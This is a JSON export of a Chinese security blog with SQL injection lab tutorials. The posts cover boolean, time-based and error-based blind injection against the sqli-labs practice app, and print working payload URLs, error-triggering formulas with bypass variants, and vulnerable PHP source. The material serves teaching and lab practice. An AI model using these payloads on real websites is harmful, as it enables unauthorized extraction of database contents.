{"meta":{"title":"Mr.zhang's Blog","subtitle":"The God love people","description":"Love coding,Love life!","author":"丨Mr.zhang丨","url":"https://www.greetdawn.top","root":"/"},"pages":[{"title":"分类","date":"2019-03-21T12:37:51.000Z","updated":"2019-05-28T13:05:35.000Z","comments":false,"path":"categories/index.html","permalink":"https://www.greetdawn.top/categories/index.html","excerpt":"","text":""},{"title":"About me","date":"2019-03-21T12:38:49.000Z","updated":"2019-12-20T09:09:31.930Z","comments":false,"path":"about/index.html","permalink":"https://www.greetdawn.top/about/index.html","excerpt":"","text":"绰号：Mr.zhang性别：男年龄：95后大龄剩男兴趣：旅游，篮球，运动，健身，coding坐标：南京"},{"title":"留言互动","date":"2019-05-24T17:18:09.000Z","updated":"2019-05-28T13:05:35.000Z","comments":true,"path":"guestbook/index.html","permalink":"https://www.greetdawn.top/guestbook/index.html","excerpt":"","text":""},{"title":"标签","date":"2019-03-21T12:38:32.000Z","updated":"2019-05-28T13:05:35.000Z","comments":false,"path":"tags/index.html","permalink":"https://www.greetdawn.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"高级注入（三）","slug":"高级注入（三）","date":"2020-03-09T05:35:41.000Z","updated":"2020-03-09T06:04:05.225Z","comments":true,"path":"2020/03/09/高级注入（三）.html","link":"","permalink":"https://www.greetdawn.top/2020/03/09/高级注入（三）.html","excerpt":"","text":"","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.greetdawn.top/categories/Web安全/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://www.greetdawn.top/tags/SQL注入/"}]},{"title":"高级注入（二）","slug":"高级注入（二）","date":"2020-03-09T01:41:11.000Z","updated":"2020-03-09T02:12:32.873Z","comments":true,"path":"2020/03/09/高级注入（二）.html","link":"","permalink":"https://www.greetdawn.top/2020/03/09/高级注入（二）.html","excerpt":"","text":"三、 SQL盲注的利用3.1 二分法3.1.1 二分法定义​ 二分法查找又称折半查找。二分法查找是在一个有序列表的基础上完成的。要查找的值x和列表的中间值m作比较，若x大于m，那么接下来从m+1的右区间内再以相同的方法取中间值作比较，循环往复此过程知道判断出x=m时即查找成功，否则相反，返回类型为布尔类型。 ​ 时间复杂度为：O(logn) 空间复杂度： O(1) 3.1.2 二分法实例 现有一个游戏场景，一个聚会当中，一个人在1-100以内的数中随机取出一个数，然后让其他人来猜，可以告诉猜大了或是猜小了，然后直到猜出这个数为止。 python代码实现如下： 1234567891011121314151617181920212223242526#/usr/bin/env python3#Author:Mr.zhang#Data:2020-1-9def BinarySearch(list1, num): min = 0 # 最小的下标 max = len(list1) - 1 # 最大的下标 i = 0 while True: i += 1 mid = (max + min) // 2 # 中间的下标每次向下取整 if num &gt; list1[mid] : min = mid + 1 # 小于需要的猜的数，则将最小下标变为中间的，又因为中间的已经猜过，所以要加1 elif num == list1[mid] : print(\"找到数据\") print(\"一共查找%d次\"%i) break else : max = mid - 1 # 大于需要的猜的数，则将最大下标变为中间的，又因为中间的已经猜过，所以要减1 if __name__ == \"__main__\": list1 = [i for i in range(0,100)] num = 83 BinarySearch(list1, num) 3.2 布尔盲注3.2.1 常用函数详解mid()函数 作用：截取字符串的一部分 使用格式：mid(column_name,start,length) 在盲注中对数据库中信息进行猜解时，使用该函数进行逐位或者多位猜解： 可以在mid函数的column_name插入完整的sql语句,需要用括号将sql语句括起来： substr()函数 作用：substr()和substring()函数实现的功能是一样的，都是截取字符串． 使用格式：string substr(string, start, length)；其参数含义和mid()函数一样． left()函数 作用：截取字符串从左边开始指定个数的字符； 使用格式：left ( string, n ), string: 要截取的字符串，n: 长度; ord()函数 作用：返回第一个字符(指start的值)的ASCII码（也可以使用ascii()函数)，一般与上面的函数组合使用 使用格式：mid(concent,start,length); 其参数含义和mid()函数一样 D的ascii码值为68 regexp正则注入 作用：使用正则表达式匹配表 使用格式: regexp ‘表达式’ 如果符合正则匹配，则显示前面sql语句执行的结果；反之则会显示set```.通常使用```limit 0,1```只显示第一条数据．1234567891011121314151617181920212223242526272829303132333435363738394041424344454647![image-20200113100425526](高级注入（二）/00831rSTgy1gcnfv5ty9lj31u808w764.png)**like****作用：** 和regexp正则注入类似![image-20200113100628303](高级注入（二）/image-20200113100628303.png)![image-20200113100708046](高级注入（二）/image-20200113100708046.png)### 3.2.2 猜解库名​ 根据注入点判断测试，发现存在布尔盲注，进行库名拆解。利用sqlilab的实验8进行相应实验测试，我们发现布尔盲注在正常请求页面的情况下，页面显示&quot;You are in...&quot;字符串；查询数据错误时，页面没有任何数据信息显示，以此为判断依据进行判断。**第一步：判断数据库库名的长度**`http://192.168.55.107:8080/Less-8/?id=1&apos; and length(database())&gt;7--+`测试库名大于7时，页面数据正常回显，如下图所示：![image-20200113104930395](高级注入（二）/image-20200113104930395.png)测试库名大于8时，页面数据没有没有回显，如下图所示：![image-20200113105111766](高级注入（二）/image-20200113105111766.png)由此可判断，数据存在一个临界值，这个值即为当前数据库库名的长度，长度为8**第二步：判断数据库的库名**`http://192.168.55.107:8080/Less-8/?id=1&apos; and ascii(substr(database(),1,1))&gt;114--+`由第一步已知当前数据库的库名长度为8，判断库名的第一位的ascii的值进行比较，当测试值为114时，当前页面数据正常回显，如下图所示:![image-20200113110947331](高级注入（二）/image-20200113110947331.png)当测试值为115时，当前页面数据回显结果为空，如下图所示：![image-20200113111046067](高级注入（二）/image-20200113111046067.png)由此可判断，数据存在一个临界值，这个值即为当前库名第一位的ascii值为115，对应字符为s以此类推判断当前库名的后续字符值，获取当前数据库的库名。### 3.2.3 猜解表名**第一步:拆解当前数据库中表的数量** http://192.168.55.106:8080/Less-8/?id=1&#39; and (select count(table_name) from information_schema.tables where table_schema=’security’) &gt;3–+ 123456789101112131415由前序步骤可知，当前数据库的库名为&quot;security&quot;,判断当前库下表的数量，当带入值为3时，当前页面数据正常回显，如下图所示：![image-20200115133524556](高级注入（二）/image-20200115133524556.png)当测试值为4时，当前页面数据回显结果为空，如下图所示：![image-20200115133656165](高级注入（二）/00831rSTgy1gcnfvcykctj327y0ioq6t.png)由此可判断，数据存在一个临界值，这个值即为当前库下表的数量为4。**第二步:拆解当前数据库中其中一个表的表名**```sqlhttp://192.168.55.106:8080/Less-8/?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)) &gt; 100--+ 由前序步骤可知，当前数据库的库名为”security”,当前库中表的数量为4，判断当前库中第一表表名的第一字母，当带入值为100时，当前页面数据正常回显，如下图所示： 1http://192.168.55.106:8080/Less-8/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)) &gt; 101--+ 当带入值为101时，当前页面数据回显为空，如下图所示： 由此可判断，数据存在一个临界值，这个值即为当前表名第一位的ascii值为101，对应字符为e 以此类推判断当前表名的后续字符值，获取当前数据库中的第一个表名。 3.2.4 猜解字段名第一步:拆解表中字段的数量 1http://192.168.55.106:8080/Less-8/?id=1&apos; and (select count(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;emails&apos;) &gt; 1--+ 由前序步骤可知，当前数据库的库名为”security”、第一个表名为”emails”,判断当前库下表的数量。 当带入值为1时，当前页面数据正常回显，如下图所示： 1http://192.168.55.106:8080/Less-8/?id=1&apos; and (select count(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;emails&apos;) &gt; 2--+ 当带入值为2时，当前页面数据回显为空，如下图所示： 由此可判断，数据存在一个临界值，这个值即为当前emails表中字段的数量为2。 第二步:拆解表中字段的第一个字段的名称 1http://192.168.55.106:8080/Less-8/?id=1&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;emails&apos; limit 0,1),1,1))&gt; 104--+ 由前序步骤可知，当前数据库的库名为”security”、第一个表名为”emails”,判断当前表中第一个字段中第一个字母为。 当带入值为104时，当前页面数据正常回显，如下图所示： 1http://192.168.55.106:8080/Less-8/?id=1&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;emails&apos; limit 0,1),1,1))&gt; 105--+ 当带入值为105时，当前页面数据回显为空，如下图所示： 由此可判断，数据存在一个临界值，这个值即为当前字段名第一位的ascii值为105，对应字符为i 以此类推判断当前字段名的后续字符值，获取当前表中的第一个字段名称。 3.2.5 猜解字段内容第一步:拆解字段内容数量 1http://192.168.55.106:8080/Less-8/?id=1' and (select count(id) from emails) &gt; 7--+ 获取emails表中，id字段的内容数量 当带入值为7时，页面数据正常回显，如下图所示： 1http://192.168.55.106:8080/Less-8/?id=1' and (select count(id) from emails) &gt; 8--+ 当带入值为8时，页面数据回显结果为空，如下图所示： 由此可判断，数据存在一个临界值，这个值即为当前字段内容数量8 第二步:拆解字段内容长度 1http://192.168.55.106:8080/Less-8/?id=1&apos; and length((select id from emails limit 0,1))&gt;0--+ 获取id字段中，第一个字段内容的长度 当带入值为0时，页面数据正常回显，如下图所示： 1http://192.168.55.106:8080/Less-8/?id=1&apos; and length((select id from emails limit 0,1))&gt;1--+ 当带入值为1时，页面数据回显结果为空，如下图所示： 由此可判断，数据存在一个临界值，这个值即为当前字段长度值1。 按照此步骤可以一次判断其他字段的长度。 第三步:拆解字段内容 1http://192.168.55.106:8080/Less-8/?id=1&apos; and ascii(substr((select id from emails limit 0,1),1,1)) &gt;48--+ 获取字段中第一位的字段内容的ascii码值 当带入值为48时，页面数据正常回显，如下图所示： 1http://192.168.55.106:8080/Less-8/?id=1&apos; and ascii(substr((select id from emails limit 0,1),1,1)) &gt;49--+ 当带入值为49时，页面数据回显为空，如下图所示： 由此可判断，数据存在一个临界值，这个值即为当前id字段第一个内容第一位ascii码值为49，即为数字1 后续字段内容按此步骤继续判断即可。 若要获取库中其他信息，按以上步骤，修改payload中的值即可获取特性的内容。 3.3 时间盲注3.3.1 常用函数详解if()函数 格式：if(expr1,expr2,expr3) 定义：判断函数，如果expr1是TRUE(expr1&lt;&gt; 0 and expr1 &lt;&gt; null,”&lt;&gt;”是不等于的意思)，则if()返回值是expr2；否则返回值为expr3。返回值类型为数字或者字符串，具体情况需要视所在语境而定。 使用细节: select * from users; select if(id &gt; 7, &#39;exist&#39;, &#39;null&#39;) from users 3.3.2 拆解库名第一步：猜解库名长度 1http://192.168.2.102:8080/Less-9/?id=1' and if(length(database())&gt;7,sleep(3),1)--+ 当带入值为7时，页面响应时间增长，响应时间为3s,如下图所示： 1http://192.168.2.102:8080/Less-9/?id=1&apos; and if(length(database())&gt;8,sleep(3),1)--+ 当带入值为8时，页面响应时间不变，如下图所示： 由此可判断当前数据库库名长度为8 第二步：猜解库名 1http://192.168.2.102:8080/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))&gt;114,sleep(3),1)- -+ 当带入的值为114时，页面响应时间为3s，如下图所示： 1http://192.168.2.102:8080/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))&gt;115,sleep(3),1)--+ 当带入的值为115时，页面响应时间正常 ，如下图所示： 由此可判断库名的第一个字母的ascii值为115，即s 重复以上方法依次判断库名后续字母的ascii值，获取后续字母 最终得到库名为security 3.3.3 猜解表名第一步：猜解表名数量 1http://192.168.2.102:8080/Less-9/?id=1&apos; and if((select count(table_name) from information_schema.tables where table_schema=&apos;security&apos;)&gt;3,sleep(3),1)--+ 当带入的值为3时，页面响应时间为3s，如下图所示： 当带入的值为4时，页面响应时间正常 ，如下图所示： 1http://192.168.2.102:8080/Less-9/?id=1&apos; and if((select count(table_name) from information_schema.tables where table_schema=&apos;security&apos;)&gt;4,sleep(3),1)--+ 由此可判断，当前库中表的数量为4 第二步：猜解表的长度 1http://192.168.2.102:8080/Less-9/?id=1&apos; and if(length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1))&gt;5,sleep(3),1)--+ 当带入的值为5时，页面响应时间为3s，如下图所示： 1http://192.168.2.102:8080/Less-9/?id=1&apos; and if(length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1))&gt;6,sleep(3),1)--+ 当带入的值为6时，页面响应时间正常，如下图所示： 由此可判断，当前库中第一个表的表名长度为6 第三步：猜解表名 1http://192.168.2.102:8080/Less-9/?id=1&apos; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1))&gt;100,sleep(3),1)--+ 当带入的值为100时，页面响应时间为3s，如下图所示： 当带入的值为101时，页面响应时间正常，如下图所示： 由此可判断，第一个表名的第一个字母ascii值为101，即为e 重复以上方法一次判断后续字母和后续表名 库中的四个表名依次为：emails、referers、uagents、users 3.3.4 猜解字段名第一步：猜解users表中字段数量 1http://192.168.55.104:8080/Less-9/?id=1&apos; and if((select COUNT(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;)&gt;2,sleep(3),1)--+ 带入值为2时，页面响应时间为3s，如下图所示： 1http://192.168.55.104:8080/Less-9/?id=1&apos; and if((select COUNT(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;)&gt;3,sleep(3),1)--+ 带入值为3时，页面响应时间正常，如下图所示： 由此可判断，users表中有3个字段 第二步：判断字段名称长度 1http://192.168.55.104:8080/Less-9/?id=1&apos; and if(length((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1))&gt;1,sleep(3),1)--+ 当带入值为1时,页面响应时间为3s，如下图所示: 1http://192.168.55.104:8080/Less-9/?id=1&apos; and if(length((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1))&gt;2,sleep(3),1)--+ 但带入的值为2时，页面的响应时间正常，如下图所示： 由此可判断，当前字段名长度为2 第三步：判断字段名 1http://192.168.55.100:8080/Less-9/?id=1&apos; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1),1,1))&gt;104,sleep(3),1)--+ 当带入的值为104时，页面的响应时间为3s，如下图所示： 1http://192.168.55.100:8080/Less-9/?id=1&apos; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1),1,1))&gt;105,sleep(3),1)--+ 当带入的值为105时，页面的响应时间正常，如下图所示： 由此可判断，当前字段的第一个字母的ascii值为105，即为i 以此方法循环判断当前表中的字段名称依次为：id、email_id 3.3.5 猜解字段内容第一步:拆解字段内容数量 1http://192.168.2.220:8080/Less-9/?id=1' and if((select count(id) from emails) &gt; 7,sleep(3),1)--+ 获取emails表中，id字段的内容数量 当带入值为7时，页面回显时间明显变长，如下图所示： 1http://192.168.2.220:8080/Less-9/?id=1' and if((select count(id) from emails) &gt; 8,sleep(3),1)--+ 当带入值为8时，页面数据回显时间正常，如下图所示： 由此可判断，数据存在一个临界值，这个值即为当前字段内容数量8 第二步:拆解字段内容长度 1http://192.168.2.220:8080/Less-9/?id=1&apos; and if(length((select id from emails limit 0,1))&gt;0,sleep(3),1)--+ 获取id字段中，第一个字段内容的长度 当带入值为0时，页面回显时间明显变长，如下图所示： 1http://192.168.2.220:8080/Less-9/?id=1&apos; and if(length((select id from emails limit 0,1))&gt;1,sleep(3),1)--+ 当带入值为1时，页面回显时间正常，如下图所示： 由此可判断，数据存在一个临界值，这个值即为当前字段长度值1。 按照此步骤可以一次判断其他字段的长度。 第三步:拆解字段内容 1http://192.168.2.220:8080/Less-9/?id=1&apos; and if(ascii(substr((select id from emails limit 0,1),1,1)) &gt;48,sleep(3),1)--+ 获取字段中第一位的字段内容的ascii码值 当带入值为48时，页面回显时间明显增长，如下图所示： 1http://192.168.2.220:8080/Less-9/?id=1&apos; and if(ascii(substr((select id from emails limit 0,1),1,1)) &gt;49,sleep(3),1)--+ 当带入值为49时，页面回显时间正常，如下图所示： 由此可判断，数据存在一个临界值，这个值即为当前id字段第一个内容第一位ascii码值为49，即为数字1 后续字段内容按此步骤继续判断即可。 若要获取库中其他信息，按以上步骤，修改payload中的值即可获取特性的内容。 3.4 报错盲注3.4.1 常用函数详解​ 见 2.3.2中有详解。 3.4.2 获取数据版本信息和库名1http://192.168.2.220:8080/Less-5/?id=1' union select 1,count(*),concat(version(),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+ 1http://192.168.2.220:8080/Less-5/?id=1' union select 1,count(*),concat(database(),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+ 3.4.3 获取数据库的表名1http://192.168.2.220:8080/Less-5/?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+ 修改对应limit的第一个参数可以获取其他表名。 3.4.4 获取表中的字段名1shttp://192.168.2.220:8080/Less-5/?id=1' union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+ 3.4.5 获取字段中的内容1http://192.168.2.220:8080/Less-5/?id=1' union select 1,count(*),concat((select id from emails limit 3,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.greetdawn.top/categories/Web安全/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://www.greetdawn.top/tags/SQL注入/"}]},{"title":"高级注入（一）","slug":"高级注入（一）","date":"2020-03-08T11:32:54.000Z","updated":"2020-03-08T12:07:48.432Z","comments":true,"path":"2020/03/08/高级注入（一）.html","link":"","permalink":"https://www.greetdawn.top/2020/03/08/高级注入（一）.html","excerpt":"","text":"课程简介​ 主要讲解SQL盲注基本概念，SQL盲注的挖掘方式和详细的利用过程（猜解库、表、字段名和字段内容），使用二分法基于SQL盲注漏洞的python脚本开发详解。 ​ 主要讲解常用SQL注入自动化工具的使用，非常规SQL注入漏洞的挖掘与利用，常见Waf限制下的SQL注入绕过姿势和技巧，SQL注入漏洞的防御手段详解。 一、 SQL盲注1.1 SQL盲注的概述​ 对于正常的SQL注入漏洞来说，我们一般是可以直接通过页面回显的信息情况进行判断，当前位置是否存在注入，从而进一步去猜解当前数据库的库名、表名、字段名以及字段内容。但对于SQL盲注来说，是不能通过直接显示的途径来获取数据库的数据的。在盲注中，攻击者只能根据其页面返回的不同来判断，可能是页面内容的不同（报错），也可能是页面的响应时间不同（时间）等。 1.2 SQL盲注的分类 布尔盲注 时间盲注 报错盲注 二、SQL盲注的挖掘2.1 布尔盲注2.1.1 概述​ 页面只返回True和False两种页面类型，利用页面返回不同，逐一猜解数据内容的方式，我们称为布尔盲注。 2.1.2 注入点判断方法：单引号带入法 这边使用一个sqlilab的一个环境，正常情况下请求目标服务器的url:http://192.168.55.103/Less-8/?id=1，页面是可以正常显示。 在id位置处带入单引号url:http://192.168.55.103/Less-8/?id=1&#39;,发现页面没有数据的正常回显。 注：通过页面的回显结果，正常输入页面返回正常为True，带入单引号造成原始数据库查询语句报错，返回的页面结果为空，但是并有错误信息输出，为False。通过上述测试方法判断。 源代码分析 1234567891011121314151617181920212223242526272829303132333435&lt;?php//including the Mysql connect parameters.include(\"../sql-connections/sql-connect.php\");error_reporting(0);// take the variablesif(isset($_GET['id']))&#123; $id=$_GET['id']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'ID:'.$id.\"\\n\"); fclose($fp); // connectivity $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125; else &#123;echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; //echo 'You are in...........'; //print_r(mysql_error()); //echo \"You have an error in your SQL syntax\"; echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;?&gt; 上述代码为当前环境查询数据调用数据库的php源代码，我们主要来分析源代码中主要的部分。 $id=$_GET[&#39;id&#39;]； 接收用户输入id的值 当用户正常输入1时，此时$id=1 $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;此为数据库的查询语句 用户输入数据后，原查询语句为 $sql=&quot;SELECT * FROM users WHERE id=&#39;1&#39; LIMIT 0,1&quot;; 带入到数据库查询后，就将id=1的数据内容返回给浏览器 当我们带入非法字符单引号的时候，此时$id=1&#39; 原查询语句为 $sql=&quot;SELECT * FROM users WHERE id=&#39;1&#39;&#39; LIMIT 0,1&quot;; 我们发现原本查询语句中有单引号，当我们带入单引号时，会导致原本的单引号无法闭合而造成查询语句报错，无法正常查询数据内容 2.2 时间盲注2.2.1 概述​ 正常情况下，当对数据库进行查询操作时，如果查询条件不存在，语句执行的时间是0ms；如果查询条件满足，语句执行速度也会非常快，接近0ms；这时候，可以使用sleep()或BENCHMARK()函数,在满足条件时，对查询的时间进行延长，通过浏览器的响应时间判断是否存在时间盲注。 2.2.3 时间布尔的区别​ 前面讲过布尔盲注，这里有小伙伴可能会质疑二者有什么区别，可以想象一个场景，无论输入任何字符（不管是正确的语句，还是恶意的注入语句），web页面都会正常显示（页面被管理员采用了”重定向”或”屏蔽”等措施），这样就无法通过布尔盲注进行判断是否存在注入了，只能通过时间延迟判断。 2.2.3 注入点判断判断函数 sleep(n) 格式：sleep(n)，n为设置的时间，单位是s(秒)； 定义：时间延迟函数，借助此函数可以在processlist中捕获到执行迅速不易被查看到的语句，以确定程序是否确实在server端发起该语句。 使用细节： 正常查询数据的时间为0s 带入sleep函数查询数据的时间 从图中我们可以清楚的看到，带入sleep函数的查询语句，查询数据的时间明显增长 benchmark()函数 格式：benchmark(count,expr)，执行表达式expr的count(重复次数) 定义：用来测试mysql进程有多快，设定好执行expr(表达式)的次数(count)，可以看到时间的变化； 使用细节： 页面延时法 首先，我们正常请求目标页面url:http://192.168.55.106/Less-9/?id=1，页面正常返回数据结果 带入单引号进行测试尝试，此时url为url:http://192.168.55.106/Less-9/?id=1&#39;，请求之后我们发现页面显示结果和原来一样，没有任何变化。这就回到我们所讲到的时间盲注和布尔盲注的一个区别，我们可能无法从页面响应结果进行直接判断。 带入sleep函数镜进行测试判断，此时url为url:http://192.168.55.106/Less-9/?id=1&#39; and sleep(5)--+，我们发现页面结果的回显时间明显增长。 综上测试过程，我们可以通过页面响应的时间判断，当前页面是否存在注入。当我们带入sleep函数时，我们可以判断出因为sleep能延长数据的查询时间，我们在请求页面时，我们构造的sleep函数被带入到了原有的查询语句中去执行，导致了页面响应时间变长，由此我们可以判断出当前页面存在时间盲注。 源代码分析 123456789101112131415161718192021222324252627282930if(isset($_GET[&apos;id&apos;]))&#123;$id=$_GET[&apos;id&apos;];//logging the connection parameters to a file for analysis.$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);fwrite($fp,&apos;ID:&apos;.$id.&quot;\\n&quot;);fclose($fp);$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; //print_r(mysql_error()); //echo &quot;You have an error in your SQL syntax&quot;; echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &apos;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&apos;; &#125;&#125; else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;?&gt; $id=$_GET[&#39;id&#39;]获取用户输入的id值 $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;数据库执行语句 在前面我们带入延时函数的格式为1&#39; and sleep(5)--+ 从原语句我们可以看出我们带入构造语句后，原查询语句变成: SELECT * FROM users WHERE id=&#39;1&#39; and sleep(5)--+&#39;LIMIT 0,1 这里的单引号用来闭合前一个单引号 –+为sql代码中的注释符，它可以将后面的代码完全注释掉，就形成了一个新的查询语句执行，这样sleep函数就被成功写入，导致查询数据结果的时间变长。 2.3 报错盲注2.3.1 原理​ 基于报错的盲注是通过输入特定语句使页面报错，网页中则会输出相关错误信息，从而使我们得到想要的基本信息——数据库名、版本、用户名等。 ​ 因为mysql有一个bug，这个bug在使用count() group by 对一些rand()函数进行操作时会返回错误信息rand()产生的数列是关键，而且想获取的数据库信息会显示在报错信息中。 2.3.2 涉及函数count() 作用:统计元组（每条数据）的个数。 rand() 作用：随机取0-1的数字 通常和floor()函数（向下取整）连用，将rand()乘以 2 是为了能得到 1 和 0 两个随机数； concat()函数 作用：聚合函数，将多个列数据合并到一个字符串中 exp()函数 *作用: *返回以e的x次方的值； 格式：exp(x) 漏洞利用：使double类型的数值超出范围从而查看报错的信息，需要mysql版本在5.5.x及以上,但是在mysql&gt;5.5.53时，则不能返回查询结果 利用语句： 1select exp(~(select * from(select version())as a )); updatexml()函数 作用: 对xml文档进行查询和修改； 格式：updatexml(xml_document,XPath_string,new_value); xml_document: String格式,为xml文档对象的名称; XPath_string: Xpath格式的字符串,可以了解下xpath语法; new_value: String格式,替换查找到的符合条件的数 报错利用：mysql版本需要5.1.x及以上 利用命令： 1select 1,updatexml(1,concat(char(38),(select @@version),char(38)),1); extractvalue()函数 作用：对xml文档进行查询和修改； 格式：extractvalue(xml_frag,xpath_expr) xml_frag: xml标记 xpath_expr: xpath表达式 报错利用：利用extractvalue函数的报错信息获取信息，mysql版本需要5.1.x及以上 利用命令： 1select 1,extractvalue(1,concat(char(38),(select @@version),char(38))); group by 作用：聚合函数，根据一个或多个列对结果集进行分组并有排序功能 报错注入公式 select count(*),concat(0x22,database(),0x22,floor(rand(0)*2))x from information_schema.tables group by x; 0x22: 表示双引号 x:相当于把concat获取的数据列更名为x，也是为了方便group by的操作 注：疑问解答，这里的rand内为什么要加0？ rand内加随机因子0是保证报错百分之百触发 不加随机因子0，可能不触发报错 关键表被禁用，可用如下格式 1select count(*) from (select 1 union select null union select !1) as a group by concat(version(),floor(rand(0)*2)); 注：这边一定要对select 1 union select null union select !1这个语句使用别名，否则会报错 rand()函数被禁用 1select min(@a:=1) from information_schema.tables group by concat(database(),@a:=(@a+1)%2); 利用myslq的重复性导致报错来获取信息 1select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; 2.3.3 注入点的判断源代码分析 123456789101112131415161718192021222324252627if(($_GET[&apos;id&apos;]))&#123;$id=$_GET[&apos;id&apos;];//logging the connection parameters to a file for analysis.$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);fwrite($fp,&apos;ID:&apos;.$id.&quot;\\n&quot;);fclose($fp);$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &apos;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&apos;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &apos;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&apos;; &#125;&#125; else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;?&gt; 查看源码，与原来的没差。但是我们发现，在判断语句当中，当sql语句正确的情况下，直接输出You are in的字符串。 但是当我们构造报错语句，导致sql报错，这边的print_r(mysql_error());语句就会输出错误语句到浏览器端供用户查看。这边我们就可以更好利用报错注入进行相关数据库的注入攻击。 单引号带入 正常请求：url:http://192.168.55.104/Less-5/?id=1 单引号带入: url:http://192.168.55.104/Less-5/?id=1&#39; 综上测试，发现数据库报错，判断存在注入。并且这边只是输出了错误信息。只能用报错盲注。","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.greetdawn.top/categories/Web安全/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://www.greetdawn.top/tags/SQL注入/"}]},{"title":"基于sql布尔盲注的python脚本开发","slug":"基于sql布尔盲注的python脚本开发","date":"2020-03-07T08:04:26.000Z","updated":"2020-03-08T11:45:51.461Z","comments":true,"path":"2020/03/07/基于sql布尔盲注的python脚本开发.html","link":"","permalink":"https://www.greetdawn.top/2020/03/07/基于sql布尔盲注的python脚本开发.html","excerpt":"","text":"4.1 python概述4.1.1 模块详解optparse 作用:定制脚本的参数化命令。 用法： import optparse #导入optparse模块 parser = optparse.OptionParser() #实例化一个 OptionParser 对象(可以带参，也可以不带参数)，带参的话会把参数变量的内容作为帮助信息输出。 parser.add_option(&quot;-D&quot;, &quot;--database&quot;, action=&quot;store&quot;,type=&quot;string&quot;,dest=&quot;database&quot;,help=&quot;Please input test databases&quot;) #需要的命令行参数 (options,args)=parser.parse_args() #解析脚本输入的参数值，options是一个包含了option值的对象;args是一个位置参数的列表 add_option()方法中的参数说明 action: 用于控制对选项和参数的处理,像无参数选项处理。（缺省为stroe。 stroe_true, stroe_false） type: 选项的值类型,值的默认类型是字符串, 这里将值指定为其他类型. help:选项中有 -h 时打印的 help 信息. dest:可以决定解析后,取值时的属性名, 尤其适于有多个等价参数. 不指定时就是选项不加-的字符串. requests 作用：模拟人操作浏览器对网页的请求操作。 用法： import requests #导入requests模块 requests.get(‘https://github.com/timeline.json’) # GET请求 requests.post(“http://httpbin.org/post”) # POST请求 requests.put(“http://httpbin.org/put”) # PUT请求 